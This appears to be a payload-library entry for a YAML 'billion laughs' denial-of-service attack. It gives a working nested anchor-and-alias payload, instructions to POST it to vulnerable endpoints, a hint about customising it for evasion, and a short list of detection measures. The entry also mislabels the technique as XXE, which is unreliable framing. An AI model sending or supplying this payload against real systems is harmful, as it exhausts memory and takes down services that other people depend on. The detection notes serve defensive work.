---
id: 9a1613ae-20bd-47e9-9bff-c5d7a6abe60f
name: YAML-Billion-Laughs-DoS-Payload
type: code
language: yaml
verified: true
created_at: '2023-04-06T03:56:44.290313+00:00'
updated_at: '2023-04-10T20:24:44.308594+00:00'
platforms:
  - Web
tags:
  - xxe
  - dos
  - yaml
  - payload
validated: true
---

# YAML-Billion-Laughs-DoS-Payload

## Code

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

## Description

This YAML payload exploits recursive anchor and alias references to create an exponentially expanding list structure, known as a "billion laughs" attack adapted for YAML parsers. When processed by a vulnerable XXE-enabled parser, it generates billions of list elements, causing memory exhaustion and denial-of-service.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| (None) | This payload has no variables; it is self-contained and uses fixed repetitions of the string "lol" for expansion. Customize the base list content if needed for evasion. | N/A |

## Usage

Save as a .yaml file and POST to a target endpoint that parses YAML input insecurely (e.g., via curl). Used in procedures targeting configuration uploads or API data ingestion points vulnerable to XXE.

## Detection

- Monitor for YAML inputs with multiple anchor (&) and alias (*) definitions.
- Log parser errors like out-of-memory or recursion depth exceeded.
- WAF rules for detecting repeated list patterns or large YAML payloads.
- Resource monitoring for sudden memory/CPU spikes during parsing.

## Related

- [[procedures/XXE-Denial-of-Service-via-YAML-Attack]]
